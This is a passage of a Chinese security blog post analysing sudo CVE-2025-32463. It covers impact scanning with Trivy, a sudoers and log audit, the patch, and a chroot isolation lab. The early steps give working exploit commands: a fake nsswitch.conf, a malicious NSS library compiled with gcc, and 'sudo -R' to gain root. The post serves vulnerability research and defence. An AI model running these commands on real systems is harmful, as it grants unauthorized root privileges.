<li><code>hacker/etc</code> 用来存放后续所说的 <code>nsswitch.conf</code>文件 和 <code>group</code> 文件。若<code>--chroot</code> 到 <code>hacker</code> 文件夹中，那么这些文件路径将被解析为寻常模式，即：<ul>
<li><code>hacker/etc/nsswitch.conf</code>就被解析为<code>/etc/nsswitch.conf</code>；</li>
<li><code>hacker/etc/group</code> 就被解析为<code>/etc/group</code>；</li>
</ul>
</li>
<li><code>libnss_</code> 用来存放 <code>hacker.c</code> 所编译好的恶意动态链接库。</li>
</ul>
</li>
<li><p>创建 <code>nsswitch.conf</code>文件，配置加载我们自定义的 NSS 模块，即 <code>--chroot</code>若要解析用户信息（passwd），需要加载名为 <code>hacker</code> 的 NSS 模块；</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;passwd: /hacker&quot;</span> &gt; hacker/etc/nsswitch.conf<br></code></pre></td></tr></table></figure>
</li>
<li><p>拷贝一份 group 文件以避免 NSS 报错。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /etc/group hacker/etc<br></code></pre></td></tr></table></figure></li>
</ol>
<h4 id="步骤三：构造并命名恶意共享库"><a href="#步骤三：构造并命名恶意共享库" class="headerlink" title="步骤三：构造并命名恶意共享库"></a>步骤三：构造并命名恶意共享库</h4><p>使用<code>gcc -shared -fPIC</code>编译带构造函数的共享库<code>hacker.c</code>，输出为<code>libnss_/hacker.so.2</code>，匹配<code>passwd: /hacker</code> 的模块路径拼接逻辑。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -shared -fPIC -Wl,-init,hacker -o libnss_/hacker.so.2 hacker.c<br><br></code></pre></td></tr></table></figure>

<ul>
<li>-shared：编译为共享对象（即<code>.so</code> 动态链接库）而不是可执行文件；</li>
<li>-fPIC：生成与位置无关的代码，是编译动态库时必须加的；</li>
<li>-Wl,-init,hacker：告诉链接器，当动态库被加载时，自动调用<code>hacker()</code> 函数；</li>
<li>-o libnss _&#x2F;hacker.so.2：输出文件名为<code>libnss_/hacker.so.2</code>；</li>
<li>hacker.c：源代码文件，定义了<code>void hacker(void)</code> 函数。</li>
</ul>
<h4 id="步骤四：触发漏洞执行提权"><a href="#步骤四：触发漏洞执行提权" class="headerlink" title="步骤四：触发漏洞执行提权"></a>步骤四：触发漏洞执行提权</h4><p>使用<code>sudo -R</code>进入 <code>chroot</code> 环境，并在 <code>chroot</code> 环境中执行<code>/bin/bash</code>，同时触发 <code>glibc</code>初始化 NSS，自动加载我们刚刚构造的恶意共享库<code>libnss_/hacker.so.2</code>并进行提权。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -R hacker /bin/bash<br></code></pre></td></tr></table></figure>

<p><img src="/image/image_Y6ta-LnzQ4.png" srcset="/img/loading.gif" lazyload alt="图 11：漏洞利用流程" title="图 11：漏洞利用流程"></p>
<h3 id="2-6-影响面排查"><a href="#2-6-影响面排查" class="headerlink" title="2.6 影响面排查"></a>2.6 影响面排查</h3><p><code>sudo</code> 是大多数主机都会安装的软件包，如果公司资产包含了 <code>sudo</code>，那么我们该如何进行影响面排查呢？研究过云原生安全的同学应该都听说过一款镜像安全工具：<a target="_blank" rel="noopener" href="https://trivy.dev/latest/" title="Trivy">Trivy</a>。Trivy 拥有非常强大的功能，我们这里使用的是它的漏洞扫描功能。</p>
<p><img src="/image/image_r4gp6QUwbp.png" srcset="/img/loading.gif" lazyload alt="图 12：使用 Trivy 进行影响面排查" title="图 12：使用 Trivy 进行影响面排查"></p>
<p>若需要扫描的是镜像，那么我们使用<code>image</code>子命令即可。Trivy 拥有多种扫描器，为了快速得到结果，我们仅开启了漏洞扫描器<code>vuln</code>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image &lt;image-name&gt; --scanners vuln<br></code></pre></td></tr></table></figure>

<p>Trivy 已经探测出  <code>y4ney/cve-2025-32463-lab:source</code> 的操作系统是 ubuntu:24.04，并且识别出了 226 个系统层软件包，这些系统层软件包共包含 870 个漏洞；且镜像并未被识别出应用层依赖库，因此不包含应用层的漏洞。</p>
<p><img src="/image/image_85AvWOVKeq.png" srcset="/img/loading.gif" lazyload alt="图 13：使用 Trivy 对 y4ney&#x2F;cve-2025-32463-lab:source 镜像进行扫描" title="图 13：使用 Trivy 对 y4ney&#x2F;cve-2025-32463-lab:source 镜像进行扫描"></p>
<p>若对镜像<code>y4ney/cve-2025-32463-lab:deb</code>进行扫描，则被识别出了 168 个系统层软件包和 857 个漏洞。</p>
<p><img src="/image/image_2JLJBZujvB.png" srcset="/img/loading.gif" lazyload alt="图 14：使用 Trivy 对 y4ney&#x2F;cve-2025-32463-lab:deb 镜像进行扫描" title="图 14：使用 Trivy 对 y4ney&#x2F;cve-2025-32463-lab:deb 镜像进行扫描"></p>
<p>执行下述命令，我们发现：<code>y4ney/cve-2025-32463-lab:source</code> 并未扫描出 CVE-2025-32463 漏洞，而<code>y4ney/cve-2025-32463-lab:deb</code> 却可以扫描出 CVE-2025-32463 漏洞。造成这种关键差异的原因是什么呢？我们再了解一些知识，后续再详细分析其原因。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image &lt;image-name&gt; --scanners vuln --format json --quiet | jq <span class="hljs-string">&#x27;.Results[].Vulnerabilities[]&#x27;</span>| grep CVE-2025-32463<br></code></pre></td></tr></table></figure>

<p><img src="/image/image_EUlKBOv6qe.png" srcset="/img/loading.gif" lazyload alt="图 15：两类镜像中 CVE-2025-32463 漏洞的扫描情况" title="图 15：两类镜像中CVE-2025-32463 漏洞的扫描情况"></p>
<p>Trivy 主要是通过版本比对来识别软件包中的漏洞，因此这些漏洞不一定都需要进行修复。我们需要考虑的因素包含方方面面，例如：</p>
<ul>
<li>漏洞的威胁等级并未达到高危、甚至超危；</li>
<li>漏洞的威胁等级并不等于它的风险等级；</li>
<li>包含漏洞的软件包可能并未被使用到，因此漏洞不具备可达性；</li>
<li>强行修复系统层软件包，可能会导致依赖它的应用崩溃；</li>
<li>并非所有的漏洞都拥有修复补丁，让我们进行升级；</li>
<li>……</li>
</ul>
<p>若直接对 ubuntu 官方最新的镜像进行漏洞扫描，我们都会发现：尽管是不包含任何第三方内容的官方最新镜像，也不会是完全不包含漏洞的，那么基于这些基础镜像构建的镜像，我们怎么能要求它们不能包含任何漏洞呢？</p>
<p><img src="/image/image_pyUtqydEgT.png" srcset="/img/loading.gif" lazyload alt="图 16：ubuntu 最新的官方漏洞也包含部分漏洞" title="图 16：ubuntu 最新的官方漏洞也包含部分漏洞"></p>
<p>目前业界没有完全公开的特别好的工程化方案和案例，让我们基于风险对这些漏洞进行重定级、降噪以及自动化修复。去年，我在 CCS 大会上对这方面的问题进行了探讨，但方案还未走出实验室，进行企业级别的落地，大家可以酌情参考参考。相关内容请查看<a target="_blank" rel="noopener" href="https://github.com/miao2sec/awesome-cloud-native-security/blob/main/%E6%BC%94%E7%A4%BA%E6%96%87%E7%A8%BF/%E9%87%91%E8%9E%8D%E7%A7%91%E6%8A%80%E4%B8%AD%E7%9A%84%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%EF%BC%9A%E5%9F%BA%E4%BA%8E%20eBPF%20%E5%92%8C%20WASM%20%E7%9A%84%E6%BC%8F%E6%B4%9E%E9%99%8D%E5%99%AA%E6%8A%80%E6%9C%AF.pdf" title="《金融科技中的容器安全：基于eBPF和WASM的漏洞降噪技术》">《金融科技中的容器安全：基于 eBPF 和 WASM 的漏洞降噪技术》</a>。</p>
<p><img src="/image/image_70MpL9pgzs.png" srcset="/img/loading.gif" lazyload alt="图 17：金融科技中的容器安全：基于 eBPF 和 WASM 的漏洞降噪技术" title=" 7：金融科技中的容器安全：基于eBPF和WASM的漏洞降噪技术"></p>
<p>若需要扫描的是主机，我们可以使用 Trivy 的 <code>rootfs</code>子命令。其实主机漏洞扫描和镜像漏洞扫描的原理和实现方式大同小异，唯一的区别就是：容器镜像的漏洞扫描首先需要对镜像文件进行解压缩的操作，而主机漏洞扫描则不需要。主机漏洞扫描和镜像漏洞扫描后续同样需要进行相同的目录遍历、关键文件读取以及软件包信息解析等系列的操作，然后再通过版本比对的方式完成漏洞扫描。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy rootfs / --scanners vuln<br></code></pre></td></tr></table></figure>

<p>若我们无法使用工具进行扫描，还可以利用 Trivy 的漏洞库快速查询到漏洞的影响范围。Trivy 的漏洞库是基于 <a target="_blank" rel="noopener" href="https://github.com/boltdb/bolt" title="Boltdb">Boltdb</a> 实现的，Boltdb 是 <a target="_blank" rel="noopener" href="https://github.com/etcd-io/etcd" title="Etcd">Etcd</a> 等中间件所选用的数据库。如图 18 所示，我们可以从 trivy 的缓存路径中找到其漏洞库文件<code>trivy.db</code>。</p>
<p><img src="/image/image_mEtw_DnHOG.png" srcset="/img/loading.gif" lazyload alt="图 18：查找 Trivy 漏洞库路径" title="图 18：查找 Trivy 漏洞库路径"></p>
<p>与常见的数据库不一样的是，Boltdb 数据库的使用体验不佳，无法使用 SQL 语句进行查询和编辑，我们需要编写 Golang 代码来进行更高级的操作。当然，也有封装得不错的工具，如图 19 所示，我们可以使用 <a target="_blank" rel="noopener" href="https://github.com/devilcove/bboltEdit" title="bboltEdit">bboltEdit</a> 查看和编辑 Boltdb 数据库文件。</p>
<p><img src="/image/image_wdqq-vpLhE.png" srcset="/img/loading.gif" lazyload alt="图 19：使用 bboltEdit 查看 trivy 的漏洞库" title="图 19：使用 bboltEdit 查看 trivy 的漏洞库"></p>
<p>但是该工具还是无法满足我们的需求，那就是：快速定位某 CVE 漏洞的影响范围。这里，我们再推荐一个可将 BoltDB 形式的 Trivy 漏洞库转化为 MySQL、SQLite 和 Postgres 这些常见的数据库类型的工具：<a target="_blank" rel="noopener" href="https://github.com/k1LoW/trivy-db-to" title="trivy-db-to">trivy-db-to</a>。</p>
<p>trivy-db-to 默认将各供应商的安全公告数据都整合在一张名为 <code>vulnerability_advisories</code>的表中，而 Trivy 就是利用这些安全公告数据进行版本比对，然后再使用 <code>vulnerability</code> 表的数据来补充漏洞描述、威胁等级和参考链接等详细信息。</p>
<p>因此，我们只需要在<code>vulnerability_advisories</code>中查询 CVE 编号为 CVE-2025-32463 即可。如图 20 所示，该漏洞的影响范围不仅和操作系统类型和版本有关，所影响的软件包名称和修复版本都会有所不同，因此，我们需要进行仔细地甄别。</p>
<p><img src="/image/image_6q3NTpOGrL.png" srcset="/img/loading.gif" lazyload alt="图 20：CVE-2025-32463 的影响范围" title="图 20：CVE-2025-32463 的影响范围"></p>
<p>回到之前的问题，为什么 <code>y4ney/cve-2025-32463-lab:source</code>镜像无法扫描出 CVE-2025-32463 漏洞呢？我们从两方面进行排查：</p>
<ol>
<li>Trivy 的漏洞库中是否指明了 ubuntu:24.04 镜像受该漏洞影响，且软件包名称和修复版本是多少？</li>
<li>Trivy 是否识别出了 <code>sudo</code> 系统层软件包及其版本？</li>
</ol>
<p>经过查询，第一个问题的答案是 YES，那么我们来排查第二个问题。如图 21 所示，我们发现<code>y4ney/cve-2025-32463-lab:source</code>并未被识别出 <code>sudo</code> 软件包，因此无法扫描出 CVE-2025-32463 漏洞。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image &lt;image-name&gt; --scanners vuln --list-all-pkgs --format json --quiet | jq <span class="hljs-string">&#x27;.Results[].Packages[]&#x27;</span> | grep <span class="hljs-built_in">sudo</span><br></code></pre></td></tr></table></figure>

<p><img src="/image/image_bZL07ontRY.png" srcset="/img/loading.gif" lazyload alt="图 21：两类镜像中 sudo 软件包的识别情况" title="图 21：两类镜像中 sudo 软件包的识别情况"></p>
<p>前面我们说了，Trivy 会对镜像文件进行解压缩操作，然后遍历目录、读取关键文件并解析出软件包信息，这些操作均由同一团队的<a target="_blank" rel="noopener" href="https://github.com/aquasecurity/fanal" title="Fanal">Fanal</a> 容器静态分析库完成，但是该项目于 2022 年 6 月 22 日已经归档，并作为 Trivy 的一部分进行维护和更新。</p>
<p><img src="/image/image_4wbcm-W8kC.png" srcset="/img/loading.gif" lazyload alt="图 22：fanal 项目描述" title="图 22：fanal 项目描述"></p>
<p>查看 Trivy 中的 Fanal 源码，我们发现：Trivy 主要依赖解析 apk、dpkg 和 rpm 等系统层软件包管理工具来识别系统层软件包的。而我们通过 apt 安装<code>sudo</code> 时，所使用的底层工具是 dpkg。所以 Trivy 是通过识别 dpkg 一系列配置文件和目录来识别出软件包信息的，包括 <code>sudo</code>。</p>
<p><img src="/image/image_t27w6RRkBr.png" srcset="/img/loading.gif" lazyload alt="图 23 trivy 关于 dpkg 软件包解析的源码实现" title="图 23 trivy 关于 dpkg 软件包解析的源码实现"></p>
<p><code>y4ney/cve-2025-32463-lab:deb</code>镜像正式通过 <code>dpkg</code> 安装的 <code>sduo</code>，因此可以识别出 CVE-2025-32463 漏洞。而<code>y4ney/cve-2025-32463-lab:source</code> 镜像的<code>sudo</code>是通过 <code>make</code> 自编译而来的，因此无法识别出漏洞。</p>
<p><img src="/image/image_HiGVkBsATm.png" srcset="/img/loading.gif" lazyload alt="图 24：两类镜像中不同的 sudo 安装方式说明" title="图 24：两类镜像中不同的sudo 安装方式说明"></p>
<p>这也是 Trivy 官方文档中指出的问题：Trivy 不支持第三方（或自编译）的软件包和二进制文件，但支持 Red Hat 和 Debian 等供应商提供的官方包。</p>
<p><img src="/image/image_y8eG_7iyvY.png" srcset="/img/loading.gif" lazyload alt="图 25：Trivy 不支持第三方（或自编译）的软件包和二进制文件" title="图 25：Trivy 不支持第三方（或自编译）的软件包和二进制文件"></p>
<p>这是 Trivy 工具的局限吗？我反而认为这是大多数漏洞扫描工具的局限，例如：当我们打开 Docker Hub 的 Scout 功能时，它也仅能识别出<code>y4ney/cve-2025-32463-lab:deb</code>镜像中的 sudo 软件包和 CVE-2025-32463 漏洞。</p>
<p><img src="/image/image_fRnHe3ukwq.png" srcset="/img/loading.gif" lazyload alt="图 26：Docker Hub 的 Scout 功能和 Trivy 的扫描结果一致" title="图 26：Docker Hub 的 Scout 功能和 Trivy 的扫描结果一致"></p>
<p>因此，为了避免类似的漏报事故发生，我们只能从 DevOps 中规范开发者和运维人员的操作，来提高软件供应链的透明度，即：避免使用第三方的（或自编译的）软件包和二进制文件。</p>
<p>如图 27 所示，在 CentOS 7 中漏洞复现失败。我们再次回顾图 20 查询结果，发现该漏洞所影响范围并未包括 CentOS 7，因此 CentOS 7 不受该漏洞的影响。</p>
<p><img src="/image/image_BmgXxPTqzC.png" srcset="/img/loading.gif" lazyload alt="图 27：CentOS 7 中无法进行漏洞复现" title="图 27：CentOS 7 中无法进行漏洞复现"></p>
<p>查看<a target="_blank" rel="noopener" href="https://access.redhat.com/security/cve/cve-2025-32463" title="RedHat">RedHat</a> 的安全公告数据，RedHat 告诉我们：由于受影响的版本范围有限，此漏洞不会影响 RHEL-9 或任何更早版本的 RHEL。因此，Openshift 也不会受到此漏洞的影响。</p>
<p><img src="/image/image_MdDVfo6fFs.png" srcset="/img/loading.gif" lazyload alt="图 28：RedHat 关于 CVE-2025-32463 的安全公告" title="图 28：RedHat 关于 CVE-2025-32463 的安全公告"></p>
<p>需要提示的是，漏洞的威胁等级还与供应商有关。如图 29 所示，Azure 和 cbi-mariner 都认为该漏洞的威胁等级为超危，但是 amazon 和 ubuntu 等供应商认为该漏洞的威胁等级为高危。那么我们该听谁的呢？</p>
<p><img src="/image/image_7sDv4vIv4J.png" srcset="/img/loading.gif" lazyload alt="图 29：不同供应商对 CVE-2025-32463 有不同的安全定级" title="图 29：不同供应商对 CVE-2025-32463 有不同的安全定级"></p>
<p>前面我们说了，这些操作系统供应商会对 <code>sudo</code> 进行二改和维护，因此他们还会基于操作系统的特性，对漏洞进行重定级。所以我们应该优先参考供应商所定义的威胁等级，再参考 NVD 等标准漏洞库所定义的安全等级，Trivy 也会根据这种思路自动为漏洞选择一个对应的威胁等级。</p>
<p>这是我能想到的在影响面排查中，常见的误区。最后，我已经 fork 了一份 trivy-db-to，并对其进行了二改。<a target="_blank" rel="noopener" href="https://github.com/y4ney/trivy-db-to" title="y4ney&#x2F;trivy-db-to">y4ney&#x2F;trivy-db-to</a> 不仅优化了日志的输出，还转化了数据源的数据，大家可以通过 <code>data_source</code> 表查看 trivy 的漏洞数据源。</p>
<p><img src="/image/image__bHzakfFZl.png" srcset="/img/loading.gif" lazyload alt="图 30：y4ney&#x2F;trivy-db-to 的执行结果" title="图 30 ：y4ney&#x2F;trivy-db-to 的执行结果"></p>
<p><img src="/image/image_m8qagxmflc.png" srcset="/img/loading.gif" lazyload alt="图 31：y4ney&#x2F;trivy-db-to 导出的漏洞数据源" title="图 31 ：y4ney&#x2F;trivy-db-to 导出的漏洞数据源"></p>
<h3 id="2-7-环境排查"><a href="#2-7-环境排查" class="headerlink" title="2.7 环境排查"></a>2.7 环境排查</h3><p>除了升级 <code>sudo</code> 版本，目前尚无其他有效的缓解措施。由于 <code>sudo</code> 在解析命令时存在缺陷，允许用户自定义 <code>chroot</code> 目录的机制容易引发错误，且该功能在实际中并不常用。从 <code>sudo</code> 1.9.17p1 起，<code>--chroot</code> 参数已被弃用，并计划在后续版本中彻底移除。</p>
<p>若无法通过版本比对的方式对影响面进行排查，建议对当前环境进行全面排查，确保未使用存在安全风险的 <code>chroot</code> 配置，以及避免继续使用该参数，因为如果实现不当，可能会无意中降低系统安全性。相关措施如下所示：</p>
<ul>
<li>搜索任何使用<code>chroot</code>的情况。检查<code>/etc/sudoers</code>文件以及<code>/etc/sudoers.d</code>目录下的所有规则。如果 <code>sudo</code> 规则存储在 LDAP 中，可使用如<code>ldapsearch</code> 等工具导出规则进行审查。</li>
<li>查找规则中是否使用了<code>runchroot=</code>选项或<code>CHROOT=</code> 指令。</li>
<li>还可以在系统日志中搜索 <code>sudo</code> 相关条目。任何使用了<code>chroot</code>的命令都会以<code>CHROOT=</code> 字样记录在日志中。</li>
</ul>
<h3 id="2-8-源码分析"><a href="#2-8-源码分析" class="headerlink" title="2.8 源码分析"></a>2.8 源码分析</h3><p>2013 年 6 月 28 日，<code>sudo</code> 在 1.9.14 版本的一项更改给未来引入了巨大的隐患：当在 <code>sudoers</code> 中指定了 <code>chroot</code> 时，改进了命令匹配的方式。现在，<code>sudoers</code> 插件会在进行命令匹配之前，根据需要先切换根目录。此前的做法是仅在处理路径时将 <code>chroot</code> 路径简单地添加为前缀。</p>
<p><img src="/image/image_pcalFIH05q.png" srcset="/img/loading.gif" lazyload alt="图 32：sudo 1.9.14 中引发漏洞的更改记录" title="图 32： sudo 1.9.14 中引发漏洞的更改记录"></p>
<p>问题出在允许非特权用户对其可控的、可写的、不受信任的路径调用<code>chroot()</code>。无论用户是否配置了相应的 <code>sudo</code> 规则，<code>sudo</code> 都会多次调用<code>chroot()</code>。允许低权限用户以 <code>root</code> 权限对可写位置执行<code>chroot()</code>会带来多种安全风险。许多应用程序（例如 SSH）都明确防范这种情况。例如，如果目标位置不是由 <code>root</code> 拥有，SSH 将拒绝执行<code>chroot()</code>。</p>
<p><code>pivot_root()</code>和<code>unpivot_root()</code>函数定义在<a target="_blank" rel="noopener" href="https://github.com/sudo-project/sudo/blob/f8ff956e17c36d44b9465688995821c8d890b451/plugins/sudoers/pivot.c" title="plugins&#x2F;sudoers&#x2F;pivot.c">plugins&#x2F;sudoers&#x2F;pivot.c</a>中，用于处理<code>chroot</code>相关的逻辑。在这两个函数调用之间，会触发名称服务切换（NSS）操作，导致系统从不受信任的环境中加载<code>/etc/nsswitch.conf</code> 配置文件。该文件包含指令，用于告诉系统如何获取用户、用户组和主机的信息。可以列出多个信息源，系统会按顺序搜索，直到找到匹配项为止。</p>
<p><img src="/image/image_cpESTgiONG.png" srcset="/img/loading.gif" lazyload alt="图 33：sudo 的 pivot_root() 和 unpivot_root() 函数实际上直接使用了 chroot" title="图 33：sudo 的 pivot_root() 和 unpivot_root() 函数实际上直接使用了 chroot"></p>
<p>在 Linux 系统中，<code>nsswitch.conf</code> 文件控制了系统如何查询用户、组等信息。下述文件内容表示系统会用<code>files</code>和<code>ldap</code> 两种方式来查找用户信息。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">passwd: files ldap<br></code></pre></td></tr></table></figure>

<p>如图 11 所示，我们之所以在 创建一个和 <code>hacker</code> 在同一级目录的 <code>libnss_</code> 目录，是因为恶意库是在代码退出 <code>chroot</code> 后加载的，且<a target="_blank" rel="noopener" href="https://github.com/bminor/glibc/blob/ea85e7d55087075376a29261e722e4fae14ecbe7/nss/nss_module.c#L180" title="glibc">glibc</a>（C 标准库）内部的 NSS 加载逻辑是硬编码的，它要求：所有 NSS 模块的名字格式必须是<code>libnss_&lt;source&gt;.so.&lt;version&gt;</code>。</p>
<p><img src="/image/image_kj7c-Nr14J.png" srcset="/img/loading.gif" lazyload alt="图 34：glibc 内部的 NSS 加载逻辑是硬编码的" title="图 34：glibc 内部的 NSS 加载逻辑是硬编码的"></p>
<p>我们在自定义 NSS 模块名时必须有<code>/</code> ，是因为连接的名称传递给<a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man3/dlopen.3.html" title="dlopen">dlopen</a>时，dlopen 会将 <code>/</code> 解析为（相对或绝对）路径名。从而到我们自定义的目录中加载恶意动态链接库。</p>
<p><img src="/image/image_uHiP9fGfj_.png" srcset="/img/loading.gif" lazyload alt="图 35：dlopen 会将  &#x2F;  解析为（相对或绝对）路径名" title="图 35：dlopen 会将  &#x2F;  解析为（相对或绝对）路径名"></p>
<p>正因如此，任何本地用户都可以诱使 <code>sudo</code> 加载任意的共享对象，从而以 <code>root</code> 权限执行任意代码。下面的调用栈显示了一个被 <code>sudo</code> 加载的恶意共享对象（为简洁起见，内容已被大幅精简）。</p>
<p>由于这种行为，任何本地用户都可以诱使 <code>sudo</code> 加载任意的共享对象，从而实现以 <code>root</code> 权限执行任意代码。官方所提供的调用栈显示了 <code>sudo</code> 加载的恶意共享对象（为简洁起见，该栈信息已被大量精简）。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs text">#0  0x0000763a155db181 in woot () from libnss_/woot1337.so.2<br>#1  0x0000763a1612271f in call_init<br>#8  0x0000763a1612a164 in _dl_open (file=&quot;libnss_/woot1337.so.2&quot;, <br>#14 0x0000763a15f53a0f in module_load<br>#15 0x0000763a15f53ee5 in __nss_module_load<br>#17 0x0000763a15f5460b in __GI___nss_lookup_function<br>#19 0x0000763a15f50928 in __GI___nss_passwd_lookup2<br>#20 0x0000763a15f62628 in __getpwnam_r <br>#21 0x0000763a15d59ae8 in pam_modutil_getpwnam<br>#27 0x0000763a15d58d99 in pam_acct_mgmt<br>#28 0x0000763a1577e491 in sudo_pam_approval<br>#29 0x0000763a157ce3ef in sudo_auth_approval<br>#30 check_user.constprop.0<br>#32 0x0000763a15799143 in sudoers_check_cmnd<br>#33 sudoers_policy_check<br>#34 0x00005ba00874b491 in policy_check<br>#35 main<br></code></pre></td></tr></table></figure>

<p>此<a target="_blank" rel="noopener" href="https://github.com/sudo-project/sudo/commit/fffcc07c536d8eb69df4fb2d24a094982b09086c" title="补丁">补丁</a>本质上回退到了 <code>sudo</code> 1.9.14 中实现的更改。<code>pivot_root()</code>和<code>unpivot_root()</code>函数被移除，并且在命令匹配阶段不再调用<code>chroot()</code>。应用补丁后，漏洞利用将失败，因为不再调用<code>chroot()</code>。</p>
<p><img src="/image/image_zjRVFNRVfB.png" srcset="/img/loading.gif" lazyload alt="图 36：CVE-2025-32463 的补丁" title="图 36：CVE-2025-32463 的补丁"></p>
<h2 id="0x03-chroot-的安全隔离性评估"><a href="#0x03-chroot-的安全隔离性评估" class="headerlink" title="0x03 chroot 的安全隔离性评估"></a>0x03 chroot 的安全隔离性评估</h2><p>前面我们发现，<code>sudo</code> 的 <code>--chroot</code> 参数的实现函数名称虽然是<code>pivot_root()</code>，但实际上是直接调用了<code>chroot</code> 来实现的。由于海报宣传我们不仅需要了解容器实现的底层原理，还需要评估 <code>chroot</code> 的安全隔离性。最后，让我们：</p>
<ul>
<li>通过在 ubuntu 主机上运行 Alpine 来解释容器实现的底层原理；</li>
<li>学习 <code>chroot</code>常见的两个风险：不清理环境变量和 <code>chroot</code> 越狱；</li>
<li>现代容器实现根目录切换的技术。</li>
</ul>
<h3 id="3-1-实验：在-ubuntu-主机上运行-Alpine"><a href="#3-1-实验：在-ubuntu-主机上运行-Alpine" class="headerlink" title="3.1 实验：在 ubuntu 主机上运行 Alpine"></a>3.1 实验：在 ubuntu 主机上运行 Alpine</h3><p>众所周知，容器其实只是宿主机上一个特殊的进程，当我们创建一个容器时，这个容器、也就是这个进程的根（root）目录就会被更改。所以在容器内部，我们是看不到完整的宿主机的文件系统的。接下来，我们做一个小实验，那就是：通过使用<code>chroot</code> 在宿主机上运行 Alpine。</p>
<p>容器是镜像实例化的结果，所以镜像需要封装容器所需要的文件系统，若该文件系统没有所要运行的可执行文件，那么容器将无法找到并运行它们。</p>
<ol>
<li><p>根据系统架构，到官网下载一个特定版本的最小化根文件系统，并保存为 <code>alpine.tar.gz</code> 压缩包。这里以 <code>v3.9</code> 版本为例进行说明。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">arch</span>=$(<span class="hljs-built_in">uname</span> -m); curl -o alpine.tar.gz http://dl-cdn.alpinelinux.org/alpine/v3.9/releases/<span class="hljs-variable">$arch</span>/alpine-minirootfs-3.9.0-<span class="hljs-variable">$arch</span>.tar.gz<br></code></pre></td></tr></table></figure>
</li>
<li><p>创建一个新目录，作为 <code>alpine</code> 的根目录，并将压缩包解压至新的根目录中，这样我们就可以得到一个最小化的 Linux 发行版文件系统了。由于压缩包的 <code>/dev</code> 目录包含一些设备文件等特殊文件，所以<code>tar</code> 在解压过程中会报错。在这里，暂时使用 <code>--exclude=&#39;./dev/*&#39;</code> 来忽略这些文件即可。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> alpine<br>tar --exclude=<span class="hljs-string">&#x27;./dev/*&#x27;</span> -xvf alpine.tar.gz -C alpine<br></code></pre></td></tr></table></figure>
</li>
<li><p>由于 Alpine 发行版不包含 <code>bash</code> ，所以不指定任何命令，直接执行 <code>chroot</code> 命令会报错。但如果我们在包含 <code>bash</code> 的 Linux 发行版（例如 ubuntu）中执行同样的操作就会成功。在这里，执行 <code>chroot</code> 命令时，指定 <code>sh</code> 即可解决问题。</p>
</li>
</ol>
<p><img src="/image/image_yTKKNRaN0K.png" srcset="/img/loading.gif" lazyload alt="图 37：在 ubuntu 主机上运行 Alpine Linux 系统" title="图 37：在 ubuntu 主机上运行 Alpine Linux 系统"></p>
<p>如图 37 所示，<code>alpine</code> 中的内容看起来就像是一个 Linux 文件系统的根目录，其中包含了 <code>bin</code> 、<code>lib</code> 、<code>var</code> 和 <code>tmp</code> 等目录。通过使用 <code>chroot</code> 命令过后，我们就可以在主机上运行一个简单的 Alpine 了。其实这也正是容器所做的事情，然而 <code>chroot</code> 背后所做的事情比想象中的要稍微复杂一些，这里我们就不展开进行说明了。</p>
<p>稍微总结一下，<code>chroot</code> 主要的功能就是更改当前进程的根目录。当根目录被更改后，当前进程及其子进程只能访问比新根目录层次更低的文件和目录。但是 <code>chroot</code>命令不隔离内核能力、不清理环境变量、以及不屏蔽系统调用权限，导致用户在仍然可以通过各种方式“打破沙箱”。</p>
<h3 id="3-2-风险一：环境变量"><a href="#3-2-风险一：环境变量" class="headerlink" title="3.2 风险一：环境变量"></a>3.2 风险一：环境变量</h3><p>首先，我们来回答刚刚遗留的一个问题：如图 37 所示，为什么执行<code>chroot</code>不追加命令会运行失败。那是因为，当我们执行<code>chroot</code> 命令时，只是改变了当前进程的路径解析过程，<code>chroot</code> 的子进程仍会继承父进程的环境变量。</p>
<p>例如，我可以在主机上设置环境变量 <code>NAME</code> 的值为 <code>Yaney</code> ，然后使用 <code>chroot</code> 切换到 Alpine 的文件系统中，接着我们就会发现：环境变量 <code>NAME</code> 已被继承。</p>
<p><img src="/image/image_R7fVyAYU_m.png" srcset="/img/loading.gif" lazyload alt="图 38：chroot 不会清理环境变量" title="图 38：chroot 不会清理环境变量"></p>
